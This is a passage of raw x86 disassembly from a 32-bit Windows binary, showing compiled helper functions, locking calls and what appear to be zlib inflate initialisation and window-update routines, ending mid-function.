   1b2f8:	je     0x1b315
   1b2fa:	push   DWORD PTR [ebp+0xc]
   1b2fd:	lea    eax,[ebp+0xc]
   1b300:	push   ebx
   1b301:	push   esi
   1b302:	push   eax
   1b303:	mov    ecx,edi
   1b305:	call   0x1ad74
   1b30a:	mov    ecx,DWORD PTR [eax]
   1b30c:	mov    eax,DWORD PTR [ebp+0x8]
   1b30f:	mov    BYTE PTR [eax+0x4],0x1
   1b313:	jmp    0x1b348
   1b315:	mov    DWORD PTR [ebp-0x4],ebx
   1b318:	test   al,al
   1b31a:	je     0x1b32b
   1b31c:	mov    eax,DWORD PTR [edi+0x4]
   1b31f:	cmp    ebx,DWORD PTR [eax]
   1b321:	je     0x1b2fa
   1b323:	lea    ecx,[ebp-0x4]
   1b326:	call   0x1a584
   1b32b:	push   DWORD PTR [ebp+0xc]
   1b32e:	mov    eax,DWORD PTR [ebp-0x4]
   1b331:	add    eax,0xc
   1b334:	push   eax
   1b335:	call   0x197e8
   1b33a:	test   al,al
   1b33c:	jne    0x1b2fa
   1b33e:	mov    eax,DWORD PTR [ebp+0x8]
   1b341:	mov    ecx,DWORD PTR [ebp-0x4]
   1b344:	mov    BYTE PTR [eax+0x4],0x0
   1b348:	pop    edi
   1b349:	pop    esi
   1b34a:	mov    DWORD PTR [eax],ecx
   1b34c:	pop    ebx
   1b34d:	leave  
   1b34e:	ret    0x8
   1b351:	int3   
   1b352:	int3   
   1b353:	int3   
   1b354:	int3   
   1b355:	int3   
   1b356:	mov    edi,edi
   1b358:	push   ebp
   1b359:	mov    ebp,esp
   1b35b:	push   ecx
   1b35c:	push   ecx
   1b35d:	push   DWORD PTR [ebp+0x8]
   1b360:	lea    eax,[ebp-0x8]
   1b363:	push   eax
   1b364:	call   0x1acc6
   1b369:	and    DWORD PTR [ebp+0x8],0x0
   1b36d:	lea    eax,[ebp+0x8]
   1b370:	push   eax
   1b371:	push   DWORD PTR [ebp-0x4]
   1b374:	push   DWORD PTR [ebp-0x8]
   1b377:	call   0x1aa70
   1b37c:	mov    eax,DWORD PTR [ebp+0x8]
   1b37f:	add    esp,0xc
   1b382:	leave  
   1b383:	ret    0x4
   1b386:	int3   
   1b387:	int3   
   1b388:	int3   
   1b389:	int3   
   1b38a:	int3   
   1b38b:	int3   
   1b38c:	mov    edi,edi
   1b38e:	push   ebp
   1b38f:	mov    ebp,esp
   1b391:	push   ecx
   1b392:	push   esi
   1b393:	mov    esi,ecx
   1b395:	cmp    DWORD PTR [esi+0xc],0x0
   1b399:	mov    ecx,DWORD PTR [ebp+0xc]
   1b39c:	je     0x1b3d6
   1b39e:	mov    eax,DWORD PTR [esi+0x4]
   1b3a1:	cmp    ecx,DWORD PTR [eax]
   1b3a3:	jne    0x1b3d6
   1b3a5:	cmp    DWORD PTR [ebp+0x10],eax
   1b3a8:	jne    0x1b3d6
   1b3aa:	push   DWORD PTR [eax+0x4]
   1b3ad:	mov    ecx,esi
   1b3af:	call   0x1b148
   1b3b4:	mov    ecx,DWORD PTR ds:0x7f89c
   1b3ba:	mov    eax,DWORD PTR [esi+0x4]
   1b3bd:	mov    DWORD PTR [eax+0x4],ecx
   1b3c0:	mov    eax,DWORD PTR [esi+0x4]
   1b3c3:	and    DWORD PTR [esi+0xc],0x0
   1b3c7:	mov    DWORD PTR [eax],eax
   1b3c9:	mov    eax,DWORD PTR [esi+0x4]
   1b3cc:	mov    DWORD PTR [eax+0x8],eax
   1b3cf:	mov    eax,DWORD PTR [esi+0x4]
   1b3d2:	mov    ecx,DWORD PTR [eax]
   1b3d4:	jmp    0x1b3fb
   1b3d6:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b3d9:	je     0x1b3fb
   1b3db:	push   edi
   1b3dc:	mov    edi,ecx
   1b3de:	lea    ecx,[ebp+0xc]
   1b3e1:	call   0x1a394
   1b3e6:	push   edi
   1b3e7:	lea    eax,[ebp-0x4]
   1b3ea:	push   eax
   1b3eb:	mov    ecx,esi
   1b3ed:	call   0x1aeca
   1b3f2:	mov    ecx,DWORD PTR [ebp+0xc]
   1b3f5:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b3f8:	jne    0x1b3dc
   1b3fa:	pop    edi
   1b3fb:	mov    eax,DWORD PTR [ebp+0x8]
   1b3fe:	mov    DWORD PTR [eax],ecx
   1b400:	pop    esi
   1b401:	leave  
   1b402:	ret    0xc
   1b405:	int3   
   1b406:	int3   
   1b407:	int3   
   1b408:	int3   
   1b409:	int3   
   1b40a:	mov    edi,edi
   1b40c:	push   ebp
   1b40d:	mov    ebp,esp
   1b40f:	push   esi
   1b410:	push   DWORD PTR [ebp+0x8]
   1b413:	mov    esi,ecx
   1b415:	mov    ecx,DWORD PTR [esi]
   1b417:	call   0x1b1ae
   1b41c:	mov    eax,esi
   1b41e:	pop    esi
   1b41f:	pop    ebp
   1b420:	ret    0x4
   1b423:	int3   
   1b424:	int3   
   1b425:	int3   
   1b426:	int3   
   1b427:	int3   
   1b428:	mov    edi,edi
   1b42a:	push   ebp
   1b42b:	mov    ebp,esp
   1b42d:	push   ecx
   1b42e:	push   esi
   1b42f:	push   edi
   1b430:	xor    edi,edi
   1b432:	push   edi
   1b433:	push   edi
   1b434:	push   edi
   1b435:	push   edi
   1b436:	mov    esi,0x7f86c
   1b43b:	push   esi
   1b43c:	call   DWORD PTR ds:0x1ee28
   1b442:	test   eax,eax
   1b444:	jl     0x1b468
   1b446:	mov    eax,ds:0x7f898
   1b44b:	mov    ecx,DWORD PTR ds:0x7f890
   1b451:	add    eax,0x9
   1b454:	mov    DWORD PTR [ebp-0x4],eax
   1b457:	lea    eax,[ebp-0x4]
   1b45a:	push   eax
   1b45b:	call   0x1b29e
   1b460:	push   edi
   1b461:	push   esi
   1b462:	call   DWORD PTR ds:0x1ee24
   1b468:	pop    edi
   1b469:	pop    esi
   1b46a:	leave  
   1b46b:	ret    
   1b46c:	int3   
   1b46d:	int3   
   1b46e:	int3   
   1b46f:	int3   
   1b470:	int3   
   1b471:	int3   
   1b472:	mov    edi,edi
   1b474:	push   ebp
   1b475:	mov    ebp,esp
   1b477:	push   ecx
   1b478:	push   ecx
   1b479:	push   DWORD PTR [ebp+0xc]
   1b47c:	lea    eax,[ebp-0x8]
   1b47f:	push   eax
   1b480:	call   0x1b2bc
   1b485:	mov    eax,DWORD PTR [ebp+0x8]
   1b488:	mov    ecx,DWORD PTR [ebp-0x8]
   1b48b:	mov    DWORD PTR [eax],ecx
   1b48d:	mov    cl,BYTE PTR [ebp-0x4]
   1b490:	mov    BYTE PTR [eax+0x4],cl
   1b493:	leave  
   1b494:	ret    0x8
   1b497:	int3   
   1b498:	int3   
   1b499:	int3   
   1b49a:	int3   
   1b49b:	int3   
   1b49c:	mov    edi,edi
   1b49e:	push   ebp
   1b49f:	mov    ebp,esp
   1b4a1:	push   ecx
   1b4a2:	push   ecx
   1b4a3:	push   esi
   1b4a4:	push   DWORD PTR [ebp+0x8]
   1b4a7:	lea    eax,[ebp-0x8]
   1b4aa:	push   eax
   1b4ab:	mov    esi,ecx
   1b4ad:	call   0x1acc6
   1b4b2:	and    DWORD PTR [ebp+0x8],0x0
   1b4b6:	lea    eax,[ebp+0x8]
   1b4b9:	push   eax
   1b4ba:	push   DWORD PTR [ebp-0x4]
   1b4bd:	push   DWORD PTR [ebp-0x8]
   1b4c0:	call   0x1aa70
   1b4c5:	add    esp,0xc
   1b4c8:	push   DWORD PTR [ebp-0x4]
   1b4cb:	lea    eax,[ebp-0x4]
   1b4ce:	push   DWORD PTR [ebp-0x8]
   1b4d1:	mov    ecx,esi
   1b4d3:	push   eax
   1b4d4:	call   0x1b38c
   1b4d9:	mov    eax,DWORD PTR [ebp+0x8]
   1b4dc:	pop    esi
   1b4dd:	leave  
   1b4de:	ret    0x4
   1b4e1:	int3   
   1b4e2:	int3   
   1b4e3:	int3   
   1b4e4:	int3   
   1b4e5:	int3   
   1b4e6:	mov    edi,edi
   1b4e8:	push   ebp
   1b4e9:	mov    ebp,esp
   1b4eb:	jmp    0x1b4fe
   1b4ed:	push   eax
   1b4ee:	lea    ecx,[ebp+0x2c]
   1b4f1:	call   0x1b40a
   1b4f6:	lea    ecx,[ebp+0xc]
   1b4f9:	call   0x1a2f6
   1b4fe:	mov    eax,DWORD PTR [ebp+0x14]
   1b501:	cmp    eax,DWORD PTR [ebp+0x24]
   1b504:	jne    0x1b4ed
   1b506:	mov    eax,DWORD PTR [ebp+0x8]
   1b509:	mov    ecx,DWORD PTR [ebp+0x2c]
   1b50c:	mov    DWORD PTR [eax],ecx
   1b50e:	pop    ebp
   1b50f:	ret    0x28
   1b512:	int3   
   1b513:	int3   
   1b514:	int3   
   1b515:	int3   
   1b516:	int3   
   1b517:	int3   
   1b518:	mov    edi,edi
   1b51a:	push   ebp
   1b51b:	mov    ebp,esp
   1b51d:	sub    esp,0x10
   1b520:	push   0xffffffff
   1b522:	push   DWORD PTR [ebp+0x8]
   1b525:	lea    ecx,[ebp-0x8]
   1b528:	call   0x110cc
   1b52d:	mov    ecx,DWORD PTR ds:0x7f88c
   1b533:	lea    eax,[ebp-0x8]
   1b536:	push   eax
   1b537:	lea    eax,[ebp-0x10]
   1b53a:	push   eax
   1b53b:	call   0x1b472
   1b540:	push   DWORD PTR [ebp-0x8]
   1b543:	call   0x10a9a
   1b548:	pop    ecx
   1b549:	leave  
   1b54a:	ret    0x4
   1b54d:	int3   
   1b54e:	int3   
   1b54f:	int3   
   1b550:	int3   
   1b551:	int3   
   1b552:	mov    edi,edi
   1b554:	push   ebp
   1b555:	mov    ebp,esp
   1b557:	xor    eax,eax
   1b559:	push   ebx
   1b55a:	push   esi
   1b55b:	push   edi
   1b55c:	mov    ebx,ecx
   1b55e:	mov    DWORD PTR [ebx+0x4],eax
   1b561:	mov    DWORD PTR [ebx+0x8],eax
   1b564:	mov    DWORD PTR [ebx+0xc],eax
   1b567:	mov    DWORD PTR [ebx+0x10],eax
   1b56a:	mov    DWORD PTR [ebx+0x14],eax
   1b56d:	mov    DWORD PTR [ebx+0x18],eax
   1b570:	mov    DWORD PTR [ebx+0x1c],eax
   1b573:	mov    DWORD PTR [ebx+0x20],eax
   1b576:	mov    DWORD PTR [ebx+0x24],eax
   1b579:	mov    DWORD PTR [ebx+0x28],eax
   1b57c:	mov    DWORD PTR [ebx+0x2c],eax
   1b57f:	mov    eax,DWORD PTR [ebp+0x8]
   1b582:	push   ebx
   1b583:	sub    esp,0x10
   1b586:	mov    edi,esp
   1b588:	lea    esi,[eax+0x14]
   1b58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b58c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b58f:	sub    esp,0x10
   1b592:	lea    esi,[eax+0x4]
   1b595:	mov    edi,esp
   1b597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b59a:	lea    eax,[ebp+0x8]
   1b59d:	push   eax
   1b59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b59f:	call   0x1b4e6
   1b5a4:	pop    edi
   1b5a5:	pop    esi
   1b5a6:	mov    eax,ebx
   1b5a8:	pop    ebx
   1b5a9:	pop    ebp
   1b5aa:	ret    0x4
   1b5ad:	int3   
   1b5ae:	int3   
   1b5af:	int3   
   1b5b0:	int3   
   1b5b1:	int3   
   1b5b2:	mov    edi,edi
   1b5b4:	push   ebp
   1b5b5:	mov    ebp,esp
   1b5b7:	push   ecx
   1b5b8:	push   ebx
   1b5b9:	push   0x30
   1b5bb:	call   0x10a66
   1b5c0:	xor    ebx,ebx
   1b5c2:	pop    ecx
   1b5c3:	cmp    eax,ebx
   1b5c5:	je     0x1b5d9
   1b5c7:	lea    ecx,[ebp-0x1]
   1b5ca:	push   ecx
   1b5cb:	mov    ecx,eax
   1b5cd:	call   0x1a498
   1b5d2:	mov    ds:0x7f894,eax
   1b5d7:	jmp    0x1b5df
   1b5d9:	mov    DWORD PTR ds:0x7f894,ebx
   1b5df:	push   esi
   1b5e0:	push   0x10
   1b5e2:	call   0x10a66
   1b5e7:	mov    esi,eax
   1b5e9:	pop    ecx
   1b5ea:	cmp    esi,ebx
   1b5ec:	je     0x1b600
   1b5ee:	mov    ecx,esi
   1b5f0:	mov    BYTE PTR [esi+0x8],bl
   1b5f3:	call   0x1acf8
   1b5f8:	mov    DWORD PTR ds:0x7f88c,esi
   1b5fe:	jmp    0x1b606
   1b600:	mov    DWORD PTR ds:0x7f88c,ebx
   1b606:	push   0xc
   1b608:	call   0x10a66
   1b60d:	pop    ecx
   1b60e:	pop    esi
   1b60f:	cmp    eax,ebx
   1b611:	je     0x1b625
   1b613:	lea    ecx,[ebp-0x1]
   1b616:	push   ecx
   1b617:	mov    ecx,eax
   1b619:	call   0x1ab0c
   1b61e:	mov    ds:0x7f890,eax
   1b623:	jmp    0x1b62b
   1b625:	mov    DWORD PTR ds:0x7f890,ebx
   1b62b:	push   ebx
   1b62c:	push   0x7f86c
   1b631:	call   0x11c50
   1b636:	call   eax
   1b638:	mov    DWORD PTR ds:0x7f898,0x1
   1b642:	pop    ebx
   1b643:	leave  
   1b644:	ret    
   1b645:	int3   
   1b646:	int3   
   1b647:	int3   
   1b648:	int3   
   1b649:	int3   
   1b64a:	push   0x3c
   1b64c:	push   0x7e180
   1b651:	call   0x1dadc
   1b656:	xor    esi,esi
   1b658:	push   esi
   1b659:	push   esi
   1b65a:	push   esi
   1b65b:	push   esi
   1b65c:	push   0x7f86c
   1b661:	call   DWORD PTR ds:0x1ee28
   1b667:	cmp    eax,esi
   1b669:	jl     0x1b7d9
   1b66f:	mov    DWORD PTR [ebp-0x4],esi
   1b672:	mov    edi,DWORD PTR [ebp+0x8]
   1b675:	push   edi
   1b676:	lea    eax,[ebp-0x24]
   1b679:	push   eax
   1b67a:	call   0x1a6a4
   1b67f:	cmp    DWORD PTR [eax+0x4],esi
   1b682:	setne  BYTE PTR [ebp-0x19]
   1b686:	push   DWORD PTR [ebp-0x24]
   1b689:	call   0x10a9a
   1b68e:	pop    ecx
   1b68f:	push   edi
   1b690:	lea    eax,[ebp-0x2c]
   1b693:	push   eax
   1b694:	call   0x1a6ca
   1b699:	xor    al,al
   1b69b:	cmp    DWORD PTR [edi+0x14],esi
   1b69e:	jne    0x1b6b4
   1b6a0:	lea    eax,[ebp-0x2c]
   1b6a3:	push   eax
   1b6a4:	mov    ecx,DWORD PTR ds:0x7f88c
   1b6aa:	call   0x1b356
   1b6af:	test   eax,eax
   1b6b1:	setne  al
   1b6b4:	test   al,al
   1b6b6:	je     0x1b6c7
   1b6b8:	lea    eax,[ebp-0x2c]
   1b6bb:	push   eax
   1b6bc:	mov    ecx,DWORD PTR ds:0x7f88c
   1b6c2:	call   0x1b49c
   1b6c7:	mov    ebx,DWORD PTR ds:0x7f894
   1b6cd:	cmp    DWORD PTR [ebx+0x2c],esi
   1b6d0:	jbe    0x1b730
   1b6d2:	mov    eax,ds:0x7ed34
   1b6d7:	mov    DWORD PTR [ebp-0x20],eax
   1b6da:	cmp    eax,esi
   1b6dc:	ja     0x1b6e5
   1b6de:	mov    DWORD PTR [ebp-0x20],0x1
   1b6e5:	mov    eax,DWORD PTR [ebp-0x20]
   1b6e8:	cmp    DWORD PTR [ebx+0x2c],eax
   1b6eb:	jb     0x1b730
   1b6ed:	lea    esi,[ebx+0x4]
   1b6f0:	lea    edi,[ebp-0x3c]
   1b6f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6f7:	mov    eax,DWORD PTR [ebp-0x34]
   1b6fa:	mov    eax,DWORD PTR [eax]
   1b6fc:	mov    eax,DWORD PTR [eax+0xc]
   1b6ff:	xor    ecx,ecx
   1b701:	add    eax,0x9c40
   1b706:	push   ecx
   1b707:	pop    esi
   1b708:	adc    ecx,esi
   1b70a:	mov    edx,DWORD PTR [ebp+0x8]
   1b70d:	mov    edx,DWORD PTR [edx+0xc]
   1b710:	cmp    ecx,esi
   1b712:	ja     0x1b730
   1b714:	jb     0x1b71a
   1b716:	cmp    eax,edx
   1b718:	jae    0x1b730
   1b71a:	mov    ecx,ebx
   1b71c:	call   0x1a4c6
   1b721:	mov    ecx,ebx
   1b723:	call   0x1aaf0
   1b728:	mov    ebx,DWORD PTR ds:0x7f894
   1b72e:	jmp    0x1b6e5
   1b730:	push   DWORD PTR [ebp+0x8]
   1b733:	lea    eax,[ebp-0x24]
   1b736:	push   eax
   1b737:	call   0x1a6ca
   1b73c:	push   eax
   1b73d:	lea    eax,[ebp-0x3c]
   1b740:	push   eax
   1b741:	call   0x1a716
   1b746:	push   DWORD PTR [ebp-0x24]
   1b749:	call   0x10a9a
   1b74e:	pop    ecx
   1b74f:	mov    ebx,DWORD PTR ds:0x7f894
   1b755:	lea    esi,[ebx+0x14]
   1b758:	lea    edi,[ebp-0x4c]
   1b75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b75f:	mov    esi,DWORD PTR [ebp-0x34]
   1b762:	cmp    esi,DWORD PTR [ebp-0x44]
   1b765:	je     0x1b799
   1b767:	mov    eax,DWORD PTR [esi]
   1b769:	mov    BYTE PTR [eax+0x1c],0x0
   1b76d:	mov    eax,DWORD PTR [esi]
   1b76f:	cmp    BYTE PTR [eax+0x24],0x0
   1b773:	jne    0x1b783
   1b775:	mov    BYTE PTR [eax+0x24],0x1
   1b779:	mov    eax,DWORD PTR [esi]
   1b77b:	push   DWORD PTR [eax+0x8]
   1b77e:	call   0x1a440
   1b783:	mov    eax,DWORD PTR [esi]
   1b785:	mov    ecx,DWORD PTR [eax+0x8]
   1b788:	mov    eax,DWORD PTR [ebp+0x8]
   1b78b:	mov    DWORD PTR [eax+0x8],ecx
   1b78e:	mov    ecx,DWORD PTR [esi]
   1b790:	mov    ecx,DWORD PTR [ecx+0x20]
   1b793:	inc    ecx
   1b794:	mov    DWORD PTR [eax+0x20],ecx
   1b797:	jmp    0x1b79c
   1b799:	mov    eax,DWORD PTR [ebp+0x8]
   1b79c:	mov    cl,BYTE PTR [ebp-0x19]
   1b79f:	mov    BYTE PTR [eax+0x1c],cl
   1b7a2:	lea    eax,[ebp+0x8]
   1b7a5:	push   eax
   1b7a6:	mov    ecx,ebx
   1b7a8:	call   0x1b1ae
   1b7ad:	inc    DWORD PTR ds:0x7f898
   1b7b3:	push   DWORD PTR [ebp-0x2c]
   1b7b6:	call   0x10a9a
   1b7bb:	pop    ecx
   1b7bc:	jmp    0x1b7c5
   1b7be:	xor    eax,eax
   1b7c0:	inc    eax
   1b7c1:	ret    
   1b7c2:	mov    esp,DWORD PTR [ebp-0x18]
   1b7c5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b7cc:	push   0x0
   1b7ce:	push   0x7f86c
   1b7d3:	call   DWORD PTR ds:0x1ee24
   1b7d9:	call   0x1db21
   1b7de:	ret    0x4
   1b7e1:	int3   
   1b7e2:	int3   
   1b7e3:	int3   
   1b7e4:	int3   
   1b7e5:	int3   
   1b7e6:	push   0x48
   1b7e8:	push   0x7e1a0
   1b7ed:	call   0x1dadc
   1b7f2:	xor    ebx,ebx
   1b7f4:	push   ebx
   1b7f5:	push   ebx
   1b7f6:	push   ebx
   1b7f7:	push   ebx
   1b7f8:	push   0x7f86c
   1b7fd:	call   DWORD PTR ds:0x1ee28
   1b803:	cmp    eax,ebx
   1b805:	jl     0x1b8b3
   1b80b:	mov    DWORD PTR [ebp-0x4],ebx
   1b80e:	push   DWORD PTR ds:0x7f890
   1b814:	lea    ecx,[ebp-0x28]
   1b817:	call   0x1b208
   1b81c:	mov    BYTE PTR [ebp-0x19],bl
   1b81f:	cmp    DWORD PTR [ebp-0x20],ebx
   1b822:	je     0x1b842
   1b824:	mov    eax,DWORD PTR [ebp-0x24]
   1b827:	mov    eax,DWORD PTR [eax]
   1b829:	mov    eax,DWORD PTR [eax+0x8]
   1b82c:	cmp    eax,DWORD PTR ds:0x7f898
   1b832:	ja     0x1b842
   1b834:	mov    BYTE PTR [ebp-0x19],0x1
   1b838:	lea    ecx,[ebp-0x28]
   1b83b:	call   0x1ab66
   1b840:	jmp    0x1b81f
   1b842:	cmp    BYTE PTR [ebp-0x19],bl
   1b845:	je     0x1b87d
   1b847:	push   DWORD PTR ds:0x7f894
   1b84d:	lea    ecx,[ebp-0x58]
   1b850:	call   0x1b552
   1b855:	mov    esi,DWORD PTR [ebp+0x8]
   1b858:	push   esi
   1b859:	lea    eax,[ebp-0x58]
   1b85c:	push   eax
   1b85d:	call   0x1a7b4
   1b862:	cmp    DWORD PTR [esi],ebx
   1b864:	jne    0x1b875
   1b866:	lea    eax,[ebp-0x28]
   1b869:	push   eax
   1b86a:	mov    ecx,DWORD PTR ds:0x7f890
   1b870:	call   0x1b246
   1b875:	lea    ecx,[ebp-0x58]
   1b878:	call   0x1b192
   1b87d:	lea    ecx,[ebp-0x28]
   1b880:	call   0x1ab32
   1b885:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b88c:	jmp    0x1b8a7
   1b88e:	xor    eax,eax
   1b890:	inc    eax
   1b891:	ret    
   1b892:	mov    esp,DWORD PTR [ebp-0x18]
   1b895:	mov    eax,DWORD PTR [ebp+0x8]
   1b898:	mov    DWORD PTR [eax],0x2
   1b89e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b8a5:	xor    ebx,ebx
   1b8a7:	push   ebx
   1b8a8:	push   0x7f86c
   1b8ad:	call   DWORD PTR ds:0x1ee24
   1b8b3:	call   0x1db21
   1b8b8:	ret    0x4
   1b8bb:	int3   
   1b8bc:	int3   
   1b8bd:	int3   
   1b8be:	int3   
   1b8bf:	int3   
   1b8c0:	mov    edi,edi
   1b8c2:	push   ebp
   1b8c3:	mov    ebp,esp
   1b8c5:	mov    ecx,DWORD PTR [ebp+0x8]
   1b8c8:	xor    edx,edx
   1b8ca:	cmp    ecx,edx
   1b8cc:	je     0x1b91c
   1b8ce:	mov    eax,DWORD PTR [ecx+0x1c]
   1b8d1:	cmp    eax,edx
   1b8d3:	je     0x1b91c
   1b8d5:	mov    DWORD PTR [eax+0x1c],edx
   1b8d8:	mov    DWORD PTR [ecx+0x14],edx
   1b8db:	mov    DWORD PTR [ecx+0x8],edx
   1b8de:	mov    DWORD PTR [ecx+0x18],edx
   1b8e1:	mov    DWORD PTR [ecx+0x30],0x1
   1b8e8:	lea    ecx,[eax+0x530]
   1b8ee:	mov    DWORD PTR [eax],edx
   1b8f0:	mov    DWORD PTR [eax+0x4],edx
   1b8f3:	mov    DWORD PTR [eax+0xc],edx
   1b8f6:	mov    DWORD PTR [eax+0x14],0x8000
   1b8fd:	mov    DWORD PTR [eax+0x20],edx
   1b900:	mov    DWORD PTR [eax+0x28],edx
   1b903:	mov    DWORD PTR [eax+0x2c],edx
   1b906:	mov    DWORD PTR [eax+0x30],edx
   1b909:	mov    DWORD PTR [eax+0x38],edx
   1b90c:	mov    DWORD PTR [eax+0x3c],edx
   1b90f:	mov    DWORD PTR [eax+0x6c],ecx
   1b912:	mov    DWORD PTR [eax+0x50],ecx
   1b915:	mov    DWORD PTR [eax+0x4c],ecx
   1b918:	xor    eax,eax
   1b91a:	jmp    0x1b91f
   1b91c:	push   0xfffffffe
   1b91e:	pop    eax
   1b91f:	pop    ebp
   1b920:	ret    0x4
   1b923:	int3   
   1b924:	int3   
   1b925:	int3   
   1b926:	int3   
   1b927:	int3   
   1b928:	mov    edi,edi
   1b92a:	push   ebp
   1b92b:	mov    ebp,esp
   1b92d:	mov    eax,DWORD PTR [ebp+0x10]
   1b930:	push   esi
   1b931:	push   edi
   1b932:	xor    edi,edi
   1b934:	cmp    eax,edi
   1b936:	je     0x1b9d1
   1b93c:	cmp    BYTE PTR [eax],0x31
   1b93f:	jne    0x1b9d1
   1b945:	cmp    DWORD PTR [ebp+0x14],0x38
   1b949:	jne    0x1b9d1
   1b94f:	mov    esi,DWORD PTR [ebp+0x8]
   1b952:	cmp    esi,edi
   1b954:	jne    0x1b95a
   1b956:	push   0xfffffffe
   1b958:	jmp    0x1b9d3
   1b95a:	mov    DWORD PTR [esi+0x18],edi
   1b95d:	cmp    DWORD PTR [esi+0x20],edi
   1b960:	jne    0x1b96c
   1b962:	mov    DWORD PTR [esi+0x20],0x1cd28
   1b969:	mov    DWORD PTR [esi+0x28],edi
   1b96c:	cmp    DWORD PTR [esi+0x24],edi
   1b96f:	jne    0x1b978
   1b971:	mov    DWORD PTR [esi+0x24],0x1cd44
   1b978:	push   0x2530
   1b97d:	push   0x1
   1b97f:	push   DWORD PTR [esi+0x28]
   1b982:	call   DWORD PTR [esi+0x20]
   1b985:	cmp    eax,edi
   1b987:	jne    0x1b98d
   1b989:	push   0xfffffffc
   1b98b:	jmp    0x1b9d3
   1b98d:	mov    ecx,DWORD PTR [ebp+0xc]
   1b990:	cmp    ecx,edi
   1b992:	mov    DWORD PTR [esi+0x1c],eax
   1b995:	jge    0x1b99e
   1b997:	mov    DWORD PTR [eax+0x8],edi
   1b99a:	neg    ecx
   1b99c:	jmp    0x1b9af
   1b99e:	mov    edx,ecx
   1b9a0:	sar    edx,0x4
   1b9a3:	inc    edx
   1b9a4:	cmp    ecx,0x30
   1b9a7:	mov    DWORD PTR [eax+0x8],edx
   1b9aa:	jge    0x1b9af
   1b9ac:	and    ecx,0xf
   1b9af:	lea    edx,[ecx-0x8]
   1b9b2:	cmp    edx,0x7
   1b9b5:	ja     0x1b9c5
   1b9b7:	push   esi
   1b9b8:	mov    DWORD PTR [eax+0x24],ecx
   1b9bb:	mov    DWORD PTR [eax+0x34],edi
   1b9be:	call   0x1b8c0
   1b9c3:	jmp    0x1b9d4
   1b9c5:	push   eax
   1b9c6:	push   DWORD PTR [esi+0x28]
   1b9c9:	call   DWORD PTR [esi+0x24]
   1b9cc:	mov    DWORD PTR [esi+0x1c],edi
   1b9cf:	jmp    0x1b956
   1b9d1:	push   0xfffffffa
   1b9d3:	pop    eax
   1b9d4:	pop    edi
   1b9d5:	pop    esi
   1b9d6:	pop    ebp
   1b9d7:	ret    0x10
   1b9da:	int3   
   1b9db:	int3   
   1b9dc:	int3   
   1b9dd:	int3   
   1b9de:	int3   
   1b9df:	int3   
   1b9e0:	mov    edi,edi
   1b9e2:	push   ebp
   1b9e3:	mov    ebp,esp
   1b9e5:	push   ecx
   1b9e6:	push   ebx
   1b9e7:	push   esi
   1b9e8:	mov    esi,DWORD PTR [edi+0x1c]
   1b9eb:	cmp    DWORD PTR [esi+0x34],0x0
   1b9ef:	mov    ebx,eax
   1b9f1:	jne    0x1ba11
   1b9f3:	mov    ecx,DWORD PTR [esi+0x24]
   1b9f6:	xor    eax,eax
   1b9f8:	inc    eax
   1b9f9:	shl    eax,cl
   1b9fb:	push   0x1
   1b9fd:	push   eax
   1b9fe:	push   DWORD PTR [edi+0x28]
   1ba01:	call   DWORD PTR [edi+0x20]
   1ba04:	mov    DWORD PTR [esi+0x34],eax
   1ba07:	test   eax,eax
   1ba09:	jne    0x1ba11
   1ba0b:	inc    eax
   1ba0c:	jmp    0x1bab3
   1ba11:	xor    eax,eax
   1ba13:	cmp    DWORD PTR [esi+0x28],eax
   1ba16:	jne    0x1ba29
   1ba18:	mov    ecx,DWORD PTR [esi+0x24]
   1ba1b:	xor    edx,edx
   1ba1d:	inc    edx
   1ba1e:	shl    edx,cl
   1ba20:	mov    DWORD PTR [esi+0x30],eax
   1ba23:	mov    DWORD PTR [esi+0x2c],eax
   1ba26:	mov    DWORD PTR [esi+0x28],edx
   1ba29:	sub    ebx,DWORD PTR [edi+0x10]
   1ba2c:	mov    eax,DWORD PTR [esi+0x28]
   1ba2f:	cmp    ebx,eax
   1ba31:	jb     0x1ba4b
   1ba33:	mov    ecx,DWORD PTR [edi+0xc]
   1ba36:	push   eax
   1ba37:	sub    ecx,eax
   1ba39:	push   ecx
   1ba3a:	push   DWORD PTR [esi+0x34]
   1ba3d:	call   0x1daa0
   1ba42:	add    esp,0xc
   1ba45:	and    DWORD PTR [esi+0x30],0x0
   1ba49:	jmp    0x1ba8c
   1ba4b:	sub    eax,DWORD PTR [esi+0x30]
   1ba4e:	mov    DWORD PTR [ebp-0x4],eax
   1ba51:	cmp    eax,ebx
   1ba53:	jbe    0x1ba58
   1ba55:	mov    DWORD PTR [ebp-0x4],ebx
   1ba58:	mov    eax,DWORD PTR [edi+0xc]
   1ba5b:	push   DWORD PTR [ebp-0x4]
   1ba5e:	sub    eax,ebx
   1ba60:	push   eax
   1ba61:	mov    eax,DWORD PTR [esi+0x34]
   1ba64:	add    eax,DWORD PTR [esi+0x30]
   1ba67:	push   eax
   1ba68:	call   0x1daa0
   1ba6d:	mov    eax,DWORD PTR [ebp-0x4]
   1ba70:	add    esp,0xc
   1ba73:	sub    ebx,eax
   1ba75:	je     0x1ba94
   1ba77:	mov    eax,DWORD PTR [edi+0xc]
   1ba7a:	push   ebx
   1ba7b:	sub    eax,ebx
   1ba7d:	push   eax
   1ba7e:	push   DWORD PTR [esi+0x34]
